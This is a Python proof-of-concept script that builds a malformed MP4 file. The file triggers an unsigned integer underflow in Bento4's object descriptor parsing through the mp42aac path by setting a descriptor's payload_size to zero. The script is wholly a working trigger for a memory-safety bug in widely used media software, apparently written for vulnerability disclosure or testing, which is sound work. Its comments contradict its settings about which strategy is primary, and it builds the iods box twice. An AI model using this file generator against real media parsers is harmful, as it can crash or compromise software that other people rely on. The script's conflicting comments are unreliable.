#!/usr/bin/env python3
"""
PoC generator for VULN-002:
  AP4_ObjectDescriptor / AP4_InitialObjectDescriptor SubStream Integer Underflow

Vulnerability location: Ap4ObjectDescriptor.cpp line 95-96
  AP4_SubStream* substream = new AP4_SubStream(stream, offset,
                                               payload_size-AP4_Size(offset-start));

When payload_size=0 and the constructor reads N bytes (N=2 for OD, N=7 for IOD
  when url_flag=0), offset-start == N, so the subtraction:
    0 - 2  = 0xFFFFFFFE  (AP4_ObjectDescriptor, tag=0x01/0x11)
    0 - 7  = 0xFFFFFFF9  (AP4_InitialObjectDescriptor, tag=0x02/0x10)
  Both are unsigned AP4_Size (uint32) values that wrap around, creating a ~4GB
  virtual substream.  This is an unsigned integer underflow / wrap-around.

Trigger path:
  mp42aac → AP4_File → AP4_IodsAtom::Create → AP4_DescriptorFactory
    → AP4_ObjectDescriptor(stream, tag=0x01, header_size=2, payload_size=0)

Tag constants (from Ap4ObjectDescriptor.h):
  AP4_DESCRIPTOR_TAG_OD      = 0x01  -> AP4_ObjectDescriptor  (reads 2 bytes)
  AP4_DESCRIPTOR_TAG_IOD     = 0x02  -> AP4_InitialObjectDescriptor (reads 7 bytes)
  AP4_DESCRIPTOR_TAG_MP4_IOD = 0x10  -> AP4_InitialObjectDescriptor (reads 7 bytes)
  AP4_DESCRIPTOR_TAG_MP4_OD  = 0x11  -> AP4_ObjectDescriptor  (reads 2 bytes)

Strategy A: OD with payload_size=0  (0 - 2 = 0xFFFFFFFE)
Strategy B: MP4_IOD with payload_size=0 and url_flag=0 (0 - 7 = 0xFFFFFFF9)
"""

import struct
import os

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_002.mp4")

# ---------------------------------------------------------------------------
# Box building helpers
# ---------------------------------------------------------------------------

def make_box(fourcc, payload):
    """Standard ISO box: 4-byte BE size + 4-byte fourcc + payload."""
    assert len(fourcc) == 4, f"fourcc must be 4 bytes: {fourcc!r}"
    size = 4 + 4 + len(payload)
    return struct.pack(">I", size) + fourcc.encode("latin-1") + payload


def make_full_box(fourcc, version, flags, payload):
    """FullBox = box header + 1-byte version + 3-byte flags + payload."""
    header = struct.pack(">B", version) + struct.pack(">I", flags)[1:]  # 4 bytes total
    return make_box(fourcc, header + payload)


# ---------------------------------------------------------------------------
# Expandable descriptor size encoding (ISO 14496-1 §8.3.3)
# ---------------------------------------------------------------------------

def encode_expandable_size(size):
    """
    Encode 'size' in MPEG-4 descriptor expandable-size format.
    Uses continuation bytes (MSB=1) followed by a final byte (MSB=0).
    For size < 128 this is a single byte.
    """
    if size == 0:
        return bytes([0x00])
    result = []
    while size > 0:
        result.insert(0, size & 0x7F)
        size >>= 7
    # Set continuation bit on all but the last byte
    for i in range(len(result) - 1):
        result[i] |= 0x80
    return bytes(result)


def encode_descriptor(tag, payload):
    """Encode one MPEG-4 descriptor: tag(1B) + expandable_size + payload."""
    return bytes([tag]) + encode_expandable_size(len(payload)) + payload


# ---------------------------------------------------------------------------
# Strategy A: ObjectDescriptor (tag=0x01) with payload_size=0
#
# AP4_DescriptorFactory reads: tag=0x01, size=0x00 → payload_size=0
# Then calls: AP4_ObjectDescriptor(stream, 0x01, header_size=2, payload_size=0)
#
# In the OD constructor:
#   stream.Tell(start)               → position P  (right after tag+size)
#   stream.ReadUI16(bits)            → reads 2 bytes (positions P and P+1)
#   stream.Tell(offset)              → offset = P + 2
#   payload_size - AP4_Size(offset-start) = 0 - 2 = 0xFFFFFFFE  <-- UNDERFLOW
#   new AP4_SubStream(stream, P+2, 0xFFFFFFFE)
#
# We pad the iods box with extra bytes so that ReadUI16 succeeds
# (if the byte stream runs dry before the constructor reads, it returns
# an error and the underflow is still computed on whatever offset resulted).
# ---------------------------------------------------------------------------

PADDING = b"\x00" * 16  # 16 safe null bytes follow the descriptor header

# Descriptor header only: tag + 0x00 (payload_size=0, no actual payload)
od_descriptor = bytes([0x01, 0x00])  # ObjectDescriptor, payload_size=0

# iods FullBox payload: version(1B) + flags(3B) + descriptor + padding
iods_payload_A = (
    bytes([0x00, 0x00, 0x00, 0x00])  # version=0, flags=0
    + od_descriptor                   # [0x01][0x00]  → triggers Strategy A
    + PADDING                         # extra bytes so ReadUI16 can succeed
)

# ---------------------------------------------------------------------------
# Strategy B: MP4_InitialObjectDescriptor (tag=0x10) with payload_size=0
#
# Constructor reads:
#   ReadUI16(bits)                   → 2 bytes  (OD-id + url_flag + inline_profile)
#   if url_flag == 0:
#     ReadUI08 x5 (profile levels)   → 5 bytes
#   Total N = 7 bytes read
#   payload_size - AP4_Size(7) = 0 - 7 = 0xFFFFFFF9  <-- UNDERFLOW
#
# To ensure url_flag=0 we can control the bits word: set it to 0x0000.
# We add enough padding so all 7 reads succeed.
# ---------------------------------------------------------------------------

iod_descriptor = bytes([0x10, 0x00])  # MP4_IOD, payload_size=0

iods_payload_B = (
    bytes([0x00, 0x00, 0x00, 0x00])  # version=0, flags=0
    + iod_descriptor                  # [0x10][0x00]  → triggers Strategy B
    + PADDING                         # extra bytes so all 7 reads succeed
)

# We use Strategy A (OD) as the primary trigger since it requires fewer
# out-of-bounds reads to set up.  To test Strategy B, swap the assignment below.
USE_IOD = True   # Set to True to test Strategy B (IOD underflow: 0-7=0xFFFFFFF9)

if USE_IOD:
    iods_payload = iods_payload_B
    strategy_label = "B: MP4_IOD tag=0x10, payload_size=0 → substream size=0xFFFFFFF9"
else:
    iods_payload = iods_payload_A
    strategy_label = "A: OD tag=0x01, payload_size=0 → substream size=0xFFFFFFFE"


# ---------------------------------------------------------------------------
# mvhd (movie header, version 0)
# ---------------------------------------------------------------------------

def build_mvhd():
    identity_matrix = struct.pack(
        ">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000,
    )
    data = (
        struct.pack(">I", 0) +         # creation_time
        struct.pack(">I", 0) +         # modification_time
        struct.pack(">I", 1000) +      # timescale
        struct.pack(">I", 0) +         # duration
        struct.pack(">I", 0x00010000) +  # rate = 1.0
        struct.pack(">H", 0x0100) +    # volume = 1.0
        bytes(10) +                    # reserved
        identity_matrix +              # 36 bytes
        bytes(24) +                    # pre_defined (6 × uint32)
        struct.pack(">I", 1)           # next_track_id
    )
    return make_full_box("mvhd", 0, 0, data)


# ---------------------------------------------------------------------------
# Assemble the full MP4
# ---------------------------------------------------------------------------

ftyp_payload = b"mp42" + struct.pack(">I", 0) + b"mp42"
ftyp_box = make_box("ftyp", ftyp_payload)

iods_box = make_full_box("iods", 0, 0, iods_payload[4:])  # iods_payload already has ver+flags

# Rebuild iods properly: FullBox adds version+flags for us
iods_inner = (
    (b"\x10\x00" if USE_IOD else b"\x01\x00")  # descriptor tag+size
    + PADDING                                    # padding bytes
)
iods_box = make_full_box("iods", 0, 0, iods_inner)

mvhd_box = build_mvhd()
moov_box = make_box("moov", mvhd_box + iods_box)

mp4_data = ftyp_box + moov_box

with open(OUT_FILE, "wb") as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUT_FILE}")
print(f"[+] Strategy: {strategy_label}")
print(f"[+] Expected trigger: AP4_ObjectDescriptor or AP4_InitialObjectDescriptor ctor")
print(f"[+]   payload_size=0 causes unsigned underflow in substream size computation")
if USE_IOD:
    print(f"[+]   0 - 7 = 0xFFFFFFF9  (AP4_InitialObjectDescriptor, tag=0x10)")
else:
    print(f"[+]   0 - 2 = 0xFFFFFFFE  (AP4_ObjectDescriptor, tag=0x01)")
